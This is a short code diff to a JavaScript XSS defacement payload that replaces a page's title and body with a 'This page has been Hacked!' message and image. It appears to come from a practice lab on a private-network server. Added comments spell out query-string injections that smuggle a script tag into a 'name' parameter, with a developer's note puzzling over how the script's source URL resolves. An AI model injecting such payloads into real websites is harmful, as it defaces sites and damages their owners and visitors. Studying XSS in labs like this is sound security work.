@@ -5,7 +5,8 @@
 
 var title = "XSS Defacement";
 var bgcolor = "#000000";
-var image_url = document.currentScript.src.replace(/\/[^/]+$/, "/stallowned.jpg");
+var image_url = document.currentScript.src=="" ?  "stallowned.jpg"
+	: document.currentScript.src.replace(/\/[^/]+$/, "/stallowned.jpg");
 var text = "This page has been Hacked!";
 var font_color = "#FF0000";
 
@@ -13,7 +14,18 @@ deface(title, bgcolor, image_url, text, font_color);
 
 function deface(pageTitle, bgColor, imageUrl, pageText, fontColor) {
 	
-	console.log(">>>" + document.currentScript.src);
+	console.log("#document.currentScript.src=[" + document.currentScript.src + "]");
+	// Weired:
+	// When called with 
+	//	?name=Bob<script src=stallowned.js></script>
+	// document.currentScript.src is empty string.
+	//
+	// When called with
+	//  ?name=name=chj<script src="http://10.22.3.84/html/xss/XSS2007/stallowned.js"></script>
+	// document.currentScript.src is non-empty, sth like:
+	//	http://10.22.3.84/html/xss/XSS2007/stallowned.js?_=1621837986043
+	//
+	// --why such difference?
 	
 	document.title = pageTitle;
 	document.body.innerHTML = '';
